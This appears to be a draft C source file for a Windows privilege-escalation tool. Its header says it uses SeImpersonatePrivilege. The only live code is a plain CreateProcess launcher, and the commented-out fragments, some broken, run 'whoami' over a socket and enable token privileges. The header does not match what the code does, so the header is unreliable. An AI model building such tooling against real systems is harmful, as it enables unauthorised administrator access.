/*
* Author: Aleksa Zatezalo
* Date: September 2023
* Description: Uses the SEImpersonate Priveledge to act as an administrator. 
*/

#include "spoofer.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <iostream>
#include <tchar.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

// int username(int sockfd){

//     /*print Impersonator*/
//     char *print_this = "\r\n\r\n[+] The Current User Is: ";
//     send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
//     char *whoami = "whoami\r\n";
//     char *name = doexec(whoami, 0);
//     send(sockfd, name, sizeof(char) * strlen(name), 0);
//     free(name);
//     return 0;
// }

// find process ID by process name
// int findMyProc(const char *procname) {

//   HANDLE hSnapshot;
//   PROCESSENTRY32 pe;
//   int pid = 0;
//   BOOL hResult;

//   // snapshot of all processes in the system
//   hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//   if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

//   // initializing size: needed for using Process32First
//   pe.dwSize = sizeof(PROCESSENTRY32);

//   // info about first process encountered in a system snapshot
//   hResult = Process32First(hSnapshot, &pe);

//   // retrieve information about the processes
//   // and exit if unsuccessful
//   while (hResult) {
//     // if we find the process: return process ID
//     if (strcmp(procname, pe.szExeFile) == 0) {
//       pid = pe.th32ProcessID;
//       break;
//     }
//     hResult = Process32Next(hSnapshot, &pe);
//   }

//   // closes an open handle (CreateToolhelp32Snapshot)
//   CloseHandle(hSnapshot);
//   OpenProccessToken()
//   return pid;
// }

// BOOL EnablePrivilege(LPCWSTR privilege) {
// 	//First lets get the LUID of the provided privilege
// 	LUID privLuid;
// 	if (!LookupPrivilegeValue(NULL, privilege, &privLuid)) {
// 		printf("LookupPrivilegeValue error() : % u\n", GetLastError());
// 		return false;
// 	}

// 	//Lets open a handle to our current process
// 	HANDLE hProcess = GetCurrentProcess();
// 	//Next open a handle to our token
// 	HANDLE hToken;
// 	//Use both TOKEN_QUERY and TOKEN_ADJUST_PRIVILEGES flags, so i can query the Token for information and also be able to adjust its privileges
// 	if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
// 		printf("OpenProcessToken() error : % u\n", GetLastError());
// 		return false;
// 	}
	
// 	//Now lets prepare the structure for the privilege we try to enable
// 	TOKEN_PRIVILEGES tp;
// 	tp.PrivilegeCount = 1;
// 	tp.Privileges[0].Luid = privLuid;
// 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

// 	//Finally enable the privilege on our current process
// 	if (!AdjustTokenPrivileges(hToken, false, &tp, NULL, NULL, NULL)) {
// 		printf("AdjustTokenPrivileges() error: %u\n", GetLastError());
// 		return false;
// 	}
// 	CloseHandle(hToken);
// 	CloseHandle(hProcess);
// 	return true;
// }

int main( int argc, TCHAR *argv[] )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( argc != 2 )
    {
        printf("Usage: %s [cmdline]\n", argv[0]);
        return 0;
    }

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}